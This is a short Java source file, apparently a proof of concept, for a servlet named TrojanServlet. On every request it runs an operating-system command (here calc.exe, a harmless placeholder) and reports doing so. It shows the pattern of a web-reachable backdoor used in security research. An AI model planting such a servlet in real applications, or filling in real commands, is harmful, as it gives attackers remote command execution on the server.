package servlet;

import javax.servlet.*;
import java.io.IOException;

public class TrojanServlet implements Servlet {

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            Process ps = Runtime.getRuntime().exec("calc.exe");
            servletResponse.getWriter().write("TrojanFilter open a calc.exe process!\n");
        } catch (Exception e) {
            System.out.println(e.toString());
        }

        servletResponse.getWriter().write("TrojanServlet open a calc.exe process");
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}
